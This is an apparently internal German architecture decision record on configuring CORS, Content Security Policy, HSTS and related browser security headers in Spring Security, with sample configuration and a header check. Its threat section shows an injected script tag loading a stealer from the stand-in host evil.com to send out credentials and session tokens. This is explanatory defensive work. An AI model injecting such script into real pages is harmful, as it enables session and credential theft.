# ADR-118 — CORS & CSP: Browser-Security-Header korrekt konfigurieren

| Feld              | Wert                                                          |
|-------------------|---------------------------------------------------------------|
| Status            | ✅ Akzeptiert                                                 |
| Entscheider       | Architektur-Board / Security-Team                             |
| Datum             | 2024-01-01                                                    |
| Review-Datum      | 2025-01-01                                                    |
| Kategorie         | Security · HTTP-Headers · Browser-Security                    |
| Betroffene Teams  | Alle Teams mit HTTP-APIs die vom Browser aufgerufen werden    |
| Abhängigkeiten    | ADR-015 (OWASP), ADR-101 (Spring Security)                   |

---

## 1. Warum Browser-Security-Header kritisch sind

```
OWASP Top 10 (2021) beinhaltet:
  A05: Security Misconfiguration
  → Fehlende Security-Header sind ein klassisches Misconfiguration-Problem

KONKRETE ANGRIFFE die durch fehlende Header ermöglicht werden:

OHNE CORS-Konfiguration:
  Evil-Website evil.com kann JavaScript ausführen das
  api.example.com/api/v2/orders aufruft — als eingeloggter Nutzer!
  → Cross-Site Request Forgery (CSRF) via Fetch API

OHNE CSP:
  XSS-Angriff injiziert <script src="https://evil.com/stealer.js">
  → Credentials, Session-Tokens werden an Angreifer gesendet

OHNE HSTS:
  Man-in-the-Middle kann HTTPS → HTTP downgraden
  → Credentials im Klartext sichtbar

OHNE X-Frame-Options / frame-ancestors:
  evil.com bettet example.com in iframe ein
  → Clickjacking: Nutzer klickt auf "Kauf bestätigen" ohne es zu wissen
```

---

## 2. Entscheidung

Alle Security-Header werden zentral in Spring Security konfiguriert.
CORS erlaubt nur explizit whitelistete Origins. CSP verhindert XSS-Angriffe
durch strikte Ressourcen-Direktiven.

---

## 3. CORS: Cross-Origin Resource Sharing

```java
// Spring Security: CORS-Konfiguration
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        return http
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            // ... rest der Konfiguration
            .build();
    }

    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        var config = new CorsConfiguration();

        // ❌ FALSCH: Wildcard für alle Origins
        // config.addAllowedOrigin("*");
        // → Erlaubt JEDEN Browser-Origin → CSRF-Angriff möglich

        // ✅ RICHTIG: Explizite Whitelist
        config.setAllowedOrigins(List.of(
            "https://app.example.com",            // Produktion
            "https://staging.example.com",        // Staging
            "http://localhost:3000",              // Lokale Entwicklung (Frontend)
            "http://localhost:4200"               // Angular Dev-Server
        ));

        // Erlaubte HTTP-Methoden
        config.setAllowedMethods(List.of("GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"));

        // Erlaubte Request-Header
        config.setAllowedHeaders(List.of(
            "Authorization",
            "Content-Type",
            "X-Requested-With",
            "X-Correlation-ID",     // Tracing (→ ADR-086)
            "Idempotency-Key"       // Idempotenz (→ ADR-086)
        ));

        // Credentials (Cookies, Authorization-Header) erlauben
        // NUR wenn allowedOrigins explizit ist (nicht mit * kombinierbar!)
        config.setAllowCredentials(true);

        // Preflight-Ergebnis cachen: Browser muss nicht bei jedem Request OPTIONS senden
        config.setMaxAge(3600L);    // 1 Stunde

        // Response-Header die Browser-JavaScript lesen darf
        config.setExposedHeaders(List.of(
            "X-Correlation-ID",
            "Location",             // Nach POST → neue Ressource
            "X-Total-Count"         // Paginierung
        ));

        var source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/api/**", config);
        return source;
    }
}
```

---

## 4. Content Security Policy (CSP)

```java
// CSP: schränkt ein welche Ressourcen eine Seite laden darf
// Verhindert XSS: injiziertes Script kann nicht ausgeführt werden

@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    return http
        .headers(headers -> headers

            // ── CSP ───────────────────────────────────────────────────
            .contentSecurityPolicy(csp -> csp.policyDirectives(
                // default-src: Fallback für alle Ressourcentypen
                "default-src 'self'; " +

                // Skripte: nur vom eigenen Origin + explizite CDNs
                "script-src 'self' https://cdn.example.com; " +
                // KEIN 'unsafe-inline' für Skripte! (Inline-Scripts verboten)
                // KEIN 'unsafe-eval'! (eval() verboten)

                // Styles: eigener Origin + Inline-Styles erlaubt (oft nötig für UI-Libraries)
                "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; " +

                // Fonts: Google Fonts erlauben
                "font-src 'self' https://fonts.gstatic.com; " +

                // Bilder: eigener Origin + Data-URLs (Base64-Inline-Bilder)
                "img-src 'self' data: https://cdn.example.com; " +

                // API-Calls: nur eigener Origin
                "connect-src 'self' https://api.example.com wss://api.example.com; " +

                // iFrame: niemals einbetten lassen (Clickjacking-Schutz)
                "frame-ancestors 'none'; " +

                // Formular-Aktionen: nur eigener Origin
                "form-action 'self'; " +

                // Base-Tag: verhindert Base-Tag-Injection
                "base-uri 'self'; " +

                // Object/Embed: komplett verboten (Flash, Plugins)
                "object-src 'none'"
            ))

            // ── Weitere Security-Header ────────────────────────────────

            // X-Content-Type-Options: verhindert MIME-Type-Sniffing
            .contentTypeOptions(ContentTypeOptionsConfig::and)

            // HSTS: Browser soll IMMER HTTPS verwenden (1 Jahr)
            .httpStrictTransportSecurity(hsts -> hsts
                .maxAgeInSeconds(31536000)
                .includeSubDomains(true)
                .preload(true)          // In HSTS-Preload-Liste eintragen
            )

            // X-Frame-Options: als Backup zu CSP frame-ancestors
            .frameOptions(frame -> frame.deny())

            // Referrer-Policy: wie viel URL-Info wird weitergegeben?
            .referrerPolicy(referrer -> referrer
                .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))

            // Permissions-Policy: Browser-APIs einschränken
            .permissionsPolicy(permissions -> permissions
                .policy("camera=(), microphone=(), geolocation=(), payment=(self)"))
        )
        .build();
}
```

---

## 5. CSP schrittweise einführen: Report-Only-Modus

```java
// Neue CSP ZUERST im Report-Only-Modus testen
// → Verstöße werden gemeldet aber nicht geblockt
// → Kein Produktions-Ausfall durch zu strikte Policy

.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp
        // Report-Only: loggt Verstöße, blockt nicht
        .policyDirectives("default-src 'self'; " +
            "report-uri /csp-report")  // Verstöße an eigenen Endpunkt melden
        .reportOnly()                  // ← Nur Report, kein Block
    )
)

// CSP-Report-Endpoint: Verstöße auswerten
@RestController
@RequestMapping("/csp-report")
public class CspReportController {

    @PostMapping(consumes = "application/csp-report")
    public ResponseEntity<Void> receiveCspReport(
            @RequestBody Map<String, Object> report) {
        var violation = (Map<String, Object>) report.get("csp-report");
        log.warn("CSP-Verstoß: blocked-uri={}, document-uri={}",
            violation.get("blocked-uri"),
            violation.get("document-uri"));
        // Metrik: wie viele Verstöße gibt es?
        // Nach Auswertung: Policy verschärfen bis Verstöße = 0
        // Dann: reportOnly() entfernen → Policy ist aktiv
        return ResponseEntity.noContent().build();
    }
}
```

---

## 6. Response-Header-Überprüfung

```bash
# Prüfen ob alle Header korrekt gesetzt sind
curl -I https://api.example.com/api/v2/orders | grep -E \
    "Content-Security-Policy|X-Frame-Options|X-Content-Type-Options|\
     Strict-Transport-Security|Referrer-Policy|Permissions-Policy"

# Erwartete Ausgabe:
# Content-Security-Policy: default-src 'self'; ...
# X-Frame-Options: DENY
# X-Content-Type-Options: nosniff
# Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
# Referrer-Policy: strict-origin-when-cross-origin
# Permissions-Policy: camera=(), microphone=(), ...

# Security-Header-Rating: https://securityheaders.com
# Ziel: Grade A oder A+
```

---

## 7. Akzeptanzkriterien

- [ ] CORS-Whitelist: keine `*`-Origin in Produktion
- [ ] CSP konfiguriert: kein `unsafe-inline` für Scripts, kein `unsafe-eval`
- [ ] HSTS: `max-age=31536000; includeSubDomains` gesetzt
- [ ] `X-Frame-Options: DENY` und `frame-ancestors 'none'` in CSP
- [ ] SecurityHeaders.com gibt Grade A für alle Produktions-URLs
- [ ] CSP-Report-Endpoint aktiv und überwacht

---

## Quellen & Referenzen

- **OWASP, "HTTP Security Response Headers Cheat Sheet"** — vollständiger Header-Katalog.
- **MDN Web Docs, "Content Security Policy"** — CSP-Direktiven-Referenz.
- **RFC 6454, "The Web Origin Concept"** — Same-Origin-Policy-Grundlage.
- **Scott Helme, "securityheaders.com"** — Security-Header-Rating-Tool.

---

## Verwandte ADRs

- [ADR-015](ADR-015-sicherheit-owasp.md) — OWASP-Sicherheits-Grundlagen
- [ADR-101](ADR-101-spring-security-oauth2.md) — Spring Security (Basis)
